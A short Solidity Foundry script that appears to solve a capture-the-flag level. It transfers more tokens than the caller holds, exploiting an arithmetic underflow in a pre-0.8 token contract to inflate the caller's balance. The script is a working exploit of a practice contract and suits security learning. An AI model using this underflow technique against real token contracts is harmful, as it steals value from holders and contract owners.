//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;



import "../src/Token.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";



contract TokenSolution is Script {
    Token public token = Token(0x86c95156E4d7aE020dc91bD92CEd5F105e66309d);
    function run () external {
        vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
        token.transfer(address(0), 21);
        console.log(token.balanceOf(vm.envAddress("MY_WALLET_ADDRESS")));
        vm.stopBroadcast();
    }
}